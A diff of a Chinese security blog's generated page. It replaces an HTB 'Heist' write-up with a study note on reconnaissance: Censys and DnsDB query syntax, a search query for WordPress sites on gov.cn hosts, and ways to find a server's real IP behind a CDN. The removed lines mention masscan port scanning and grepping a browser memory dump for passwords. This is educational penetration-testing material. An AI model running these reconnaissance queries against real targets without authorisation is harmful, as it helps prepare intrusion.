+( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn”</code></pre><h4 id="censys"><a href="#censys" class="headerlink" title="censys"></a>censys</h4><p>censys搜索引擎功能与shodan类似，以下几个文档信息。<br>地址：<a href="https://www.censys.io/" target="_blank" rel="noopener">https://www.censys.io/</a></p>
+<pre><code>https://www.censys.io/certificates/help 帮助文档
+https://www.censys.io/ipv4?q=  ip查询
+https://www.censys.io/domain?q=  域名查询
+https://www.censys.io/certificates?q= 证书查询</code></pre><h5 id="基本语法-3"><a href="#基本语法-3" class="headerlink" title="基本语法"></a>基本语法</h5><pre><code>23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not
+80.http.get.status_code: 200　　指定状态
+80.http.get.status_code:[200 TO 300]　　200-300之间的状态码
+location.country_code: DE　　国家
+protocols: (“23/telnet” or “21/ftp”)　　协议
+tags: scada　　标签
+80.http.get.headers.server：nginx　　服务器类型版本
+autonomous_system.description: University　　系统描述
+正则</code></pre><h4 id="Dnsdb搜索引擎"><a href="#Dnsdb搜索引擎" class="headerlink" title="Dnsdb搜索引擎"></a>Dnsdb搜索引擎</h4><p>dnsdb搜索引擎是一款针对dbs解析的查询平台。<br>地址：<a href="https://www.dnsdb.io/" target="_blank" rel="noopener">https://www.dnsdb.io/</a></p>
+<h5 id="查询语法"><a href="#查询语法" class="headerlink" title="查询语法"></a>查询语法</h5><ul>
+<li><p>搜索语法<br>DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会把满足所有查询条件的结果返回给用户.</p>
+</li>
+<li><p>域名查询条件<br>域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.<br>例如查询google.com 的所有DNS记录: domain:google.com.<br>域名查询可以省略domain:.</p>
+</li>
+<li><p>主机查询条件<br>查询语法:host:<br>例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com<br>主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值</p>
+</li>
+<li><p>按DNS记录类型查询<br>查询语法: type:.<br>例如只查询A记录: type:a<br>使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法</p>
+</li>
+<li><p>按IP限制<br>查询语法: ip:<br>查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效<br>查询指定IP范围: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0/24<br>IP最大范围限制65536个</p>
+</li>
+<li><p>条件组合查询的例子<br>查询google.com的所有A记录: google.com type:a</p>
+</li>
+</ul>
+<h2 id="八、真实IP"><a href="#八、真实IP" class="headerlink" title="八、真实IP"></a>八、真实IP</h2><p>详见：<br><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491648&idx=1&sn=64d948bfc39f7122ce7aa5da63536b42" target="_blank" rel="noopener">绕过 CDN 寻找真实 IP 地址的各种姿势</a></p>
+<h3 id="判断CDN"><a href="#判断CDN" class="headerlink" title="判断CDN"></a>判断CDN</h3><p>ping 如果网站前有cdn标识，则为cdn服务器<br>站长之家 看返回值</p>
+<h3 id="绕过CDN"><a href="#绕过CDN" class="headerlink" title="绕过CDN"></a>绕过CDN</h3><ul>
+<li>内部邮箱源</li>
+<li>网站phpinfo文件</li>
+<li>SSL证书探测</li>
+<li>分站ip，CDN很贵</li>
+<li>多地Ping</li>
+</ul>
+<p><a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a><br><a href="https://tools.ipip.net/ping.php" target="_blank" rel="noopener">https://tools.ipip.net/ping.php</a><br><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></p>
+<ul>
+<li>查询域名解析记录</li>
+</ul>
+<p><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a><br><a href="http://www.ip138.com/" target="_blank" rel="noopener">http://www.ip138.com/</a><br><a href="https://www.17ce.com/" target="_blank" rel="noopener">https://www.17ce.com/</a><br><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a><br><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a><br><a href="https://x.threatbook.cn/en" target="_blank" rel="noopener">https://x.threatbook.cn/en</a></p>
+<h3 id="真实ip"><a href="#真实ip" class="headerlink" title="真实ip"></a>真实ip</h3><p>搜索出来的ip直接访问，看是否正常访问。<br>返回错误则不是。</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://thief.one/2017/05/19/1/" target="_blank" rel="noopener">【渗透神器系列】搜索引擎 | nmask’s Blog</a><br><a href="https://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="noopener">Shodan 新手入坑指南</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&mid=2247485173&idx=1&sn=39fd47eea1291b470aadccfabc32ff92" target="_blank" rel="noopener">信息收集——初篇</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&mid=2247491648&idx=1&sn=64d948bfc39f7122ce7aa5da63536b42" target="_blank" rel="noopener">绕过 CDN 寻找真实 IP 地址的各种姿势</a></p>
 
             </div>
             <hr/>
@@ -713,9 +839,9 @@ findstr &quot;password&quot; ./firefox.exe_191203_172802.txt</code></pre><p><img
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《HTB(Hack The Box)系列—Heist》
+                    《学习总结篇—信息收集》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/12/02/htb-hack-the-box-xi-lie-heist/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/08/23/xue-xi-zong-jie-pian-xin-xi-shou-ji/" property="cc:attributionName"
                rel="cc:attributionURL">
                 dylan
             </a> 采用
@@ -1014,58 +1140,50 @@ findstr &quot;password&quot; ./firefox.exe_191203_172802.txt</code></pre><p><img
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
-            </div>
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/12/02/htb-hack-the-box-xi-lie-heist/">
+                <a href="/2019/08/24/xue-xi-zong-jie-pian-lou-dong-li-yong/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="HTB(Hack The Box)系列—Heist">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="学习总结篇—漏洞利用">
                         
-                        <span class="card-title">HTB(Hack The Box)系列—Heist</span>
+                        <span class="card-title">学习总结篇—漏洞利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 前言今天挑战的靶机是Hack The Box的“Heist”，10.10.10.149
-0x01 信息收集使用masscan进行全端口扫描
-masscan -p 1-65535,U:1-65535 -e tun0 10.10.10
+                            学习总结篇—漏洞利用
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-02
-                            </span>
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-24
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/HTB系列/" class="post-category" target="_blank">
-                                    HTB系列
+                            <a href="/categories/summary/" class="post-category" target="_blank">
+                                    summary
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/HTB/" target="_blank">
-                        <span class="chip bg-color">HTB</span>
+                    <a href="/tags/summary/" target="_blank">
+                        <span class="chip bg-color">summary</span>
                     </a>
                     
-                    <a href="/tags/Hack-The-Box/" target="_blank">
-                        <span class="chip bg-color">Hack The Box</span>
-                    </a>
-                    
-                    <a href="/tags/靶场/" target="_blank">
-                        <span class="chip bg-color">靶场</span>
+                    <a href="/tags/漏洞利用/" target="_blank">
+                        <span class="chip bg-color">漏洞利用</span>
                     </a>
                     
                 </div>
@@ -1079,36 +1197,31 @@ masscan -p 1-65535,U:1-65535 -e tun0 10.10.10
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/12/02/htb-hack-the-box-xi-lie-ru-men-zhi-nan/">
+                <a href="/2019/08/22/xue-xi-zong-jie-pian-zi-yuan-zheng-li/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="HTB(Hack The Box)系列—入门指南">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="学习总结篇—资源整理">
                         
-                        <span class="card-title">HTB(Hack The Box)系列—入门指南</span>
+                        <span class="card-title">学习总结篇—资源整理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            0x00 前言0x01 注册登陆注册需要邀请码
-快速获取邀请码方法一首先打开邀请界面
-https://www.hackthebox.eu/invite
-
-按下F12，打开Console输入如下代码执行
-$.post(&#39;https:/
+                            Being their worst nightmare！
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-02
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-08-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/HTB系列/" class="post-category" target="_blank">
-                                    HTB系列
+                            <a href="/categories/summary/" class="post-category" target="_blank">
+                                    summary
                                 </a>
                             
                             
@@ -1118,16 +1231,12 @@ $.post(&#39;https:/
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/HTB/" target="_blank">
-                        <span class="chip bg-color">HTB</span>
+                    <a href="/tags/summary/" target="_blank">
+                        <span class="chip bg-color">summary</span>
                     </a>
                     
-                    <a href="/tags/Hack-The-Box/" target="_blank">
-                        <span class="chip bg-color">Hack The Box</span>
-                    </a>
-                    
-                    <a href="/tags/靶场/" target="_blank">
-                        <span class="chip bg-color">靶场</span>
+                    <a href="/tags/资源整理/" target="_blank">
+                        <span class="chip bg-color">资源整理</span>
                     </a>
                     
                 </div>
@@ -1285,7 +1394,7 @@ $.post(&#39;https:/
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">44k</span>
+                <span class="white-color">44.8k</span>
             
 
             
